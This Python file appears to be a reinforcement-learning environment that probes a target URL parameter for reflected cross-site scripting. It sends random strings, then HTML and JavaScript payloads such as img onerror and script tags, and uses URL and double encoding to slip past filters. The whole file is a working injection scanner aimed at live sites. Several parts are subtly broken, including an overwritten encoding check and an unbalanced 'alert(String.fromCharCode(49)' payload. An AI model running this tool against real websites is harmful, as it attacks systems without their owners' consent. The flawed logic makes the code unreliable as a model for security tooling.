import sys, getopt, validators, random, string
import requests

class Enviroment:
    
    def __init__(self, argv):

        # Check user input
        self.checkParameters(argv)
        
        # Initiliaze xss payload
        self.js=""
        self.html=""
        self.padding=""
        self.payload=""

        # Initiliaze xss trigger
        self.expected_html=""
        self.expected_js=""
        self.expected=""

        # States
        self.states_name_to_location = {
            "testReflection":0,
            "testHtml":1,
            "testJs":2,
            "exploited":3
        }
        self.states_location_to_name= {
            0:"testReflection",
            1:"testHtml",
            2:"testJs",
            3:"exploited"
        }
        self.n_states = len(self.states_name_to_location)

        # Actions
        self.actions = {
            self.states_name_to_location["testReflection"]: {
                0: self.actionNewTestString,
                1: self.actionAddRandomChar
            },
            self.states_name_to_location["testHtml"]:{
                0: self.actionNewHtmlPayload,
                1: self.actionEncode,
                2: self.actionDubleEncode
            },
            self.states_name_to_location["testJs"]:{
                0: self.actionNewJsPayload
            },
            self.states_name_to_location["exploited"]:{
                0: self.actionNewTestString
            }
        }
        count = 0
        for element in self.actions:
            count+=len(self.actions[element])
        self.n_actions = count

    # Check user parameters
    def checkParameters(self, argv):
        USAGE="main.py -u <url> [-m <method>] -p <parameter>"

        # Default parameters
        self.method="GET"

        # Get and check parameters
        try:
            opts, args = getopt.getopt(argv,"hu:m:p:",["url=","method=","parameter="])
        except getopt.GetoptError:
            print("[!] Usage: {}".format(USAGE))
            sys.exit(1)
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                print(USAGE)
                sys.exit()
            elif opt in ("-u", "--url"):
                if not validators.url(arg):
                    print("[!] Url not valid")
                    sys.exit(1)
                else:
                    self.url=arg
            elif opt in ("-m", "--method"):
                if arg not in ("GET","POST","COOKIE"):
                    print("[!] Method not allowed")
                    sys.exit(1)
                else:
                    self.method=arg
            elif opt in ("-p", "--parameter"):
                self.parameter=arg
            
        # Required parameters
        if self.url == "":
            print("[!] Url is required, usage: {}".format(USAGE))
            sys.exit(1)
        if self.parameter == "":
            print("[!] With {} method parameter is required, usage: main.py -u <url> -m {} -p <parameter>".format(self.method, self.method))
            sys.exit(1)

    # CONNECTION TO ENDPOINT

    # Request to endpoint 
    def checkConnection(self):
        #Connection
        response = self.connection(" ")

        # Handling exception
        if type(response) != requests.models.Response:
            print("{} error: {}".format(response["type"],response["msg"]))
            sys.exit(1)
        
        # No exception, so check status code
        else:
            if response.status_code in [200]:
                self.default_response_code=response.status_code
                print(self.connectionDetail())
            else:
                print("[!] Connection failed, http status code: {}".format(response.status_code))
                sys.exit(1)
    
    # Request to endpoint
    def connection(self, value):
        try:  
            if self.method == "GET":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    params={self.parameter: value}
                )
            elif self.method == "POST":
                response = requests.post(
                    self.url,
                    timeout=5.0,
                    data={self.parameter: value}  
                )
            elif self.method == "COOKIE":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    cookies={self.parameter: value}
                )
        except (requests.exceptions.Timeout):
            return {"type":"Connection","msg":"[!] Connection failed"}
        except requests.exceptions.HTTPError as err:
            return {"type":"Http","msg":err}
        except requests.exceptions.RequestException as err:
            return {"type":"Request","msg":err}

        # No exception, so return response
        return response

    # Print connection details 
    def connectionDetail(self,):
        return "\nUrl: {}\nMethod: {}\nParameter: {}\nResponse code: {}\n".format(self.url, self.method, self.parameter, self.default_response_code)

    # XSS EXPLOITATION

    # Build Xss payload and expected responce
    def buildPayload(self):
        self.payload = self.padding + str(self.html).replace("{}", self.js, 1)
        self.expected = str(self.expected_html).replace("{}", self.expected_js, 1)

    # Execute action and return reward
    def doAction(self, state, action):
        print("\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
        self.actions[state][action]()
        self.buildPayload()
        response = self.connection(self.payload)
        return self.goalCheck(state,response)

    # Checks if an XSS has been triggered
    def goalCheck(self, state, response):
        print("Expected: {}\nResponce> {}".format(self.expected.lower(),response.text.lower()))

        # testReflection
        if self.states_location_to_name[state] == "testReflection":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                return 1, 100, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return 0, 0, False

        # testHtml
        elif self.states_location_to_name[state] == "testHtml":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                return 2, 50, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return 1, 0, False

        # testJs
        elif self.states_location_to_name[state] == "testJs":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                return 3, 100, True
            else:
                print("[filtered] payload: {}".format(self.payload))
                return 2, 0, False

    # ACTIONS TEST REFLECTION

    def actionNewTestString(self):
        random_string="".join((random.choice(string.ascii_letters) for i in range(10)))
        self.html=random_string
        self.expected_html=random_string
    
    def actionAddRandomChar(self):
        self.padding+="".join(random.choices(string.ascii_letters, k=1))

    # ACTIONS TEST HTML

    def actionNewHtmlPayload(self):
        htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<img src=x onerror={}>","<input onblur={} autofocus><input autofocus>"]
        htmlPayload = "".join(random.choices(htmlPayloads, k=1))
        self.html = htmlPayload
        self.expected_html = htmlPayload
    
    def actionEncode(self):
        self.html = self.html.replace("<","%3C")
        self.html = self.html.replace(">","%3E")
        self.html = self.html.replace("/","%2F")
        self.expected_html = self.html.replace("<","%3C")
        self.expected_html = self.html.replace(">","%3E")
        self.expected_html = self.html.replace("/","%2F")
    
    def actionDubleEncode(self):
        self.html = self.html.replace("<","%253C")
        self.html = self.html.replace(">","%253E")
        self.html = self.html.replace("/","%252F")
        self.expected_html = self.expected_html.replace("<","%3C")
        self.expected_html = self.expected_html.replace(">","%3E")
        self.expected_html = self.expected_html.replace("/","%2F")

    # ACTIONS TEST JS

    def actionNewJsPayload(self):
        jsPayloads = ["alert(1)","print()","alert(String.fromCharCode(49)","prompt(8)"]
        jsPayload = "".join(random.choices(jsPayloads, k=1))
        self.js = jsPayload
        self.expected_js = jsPayload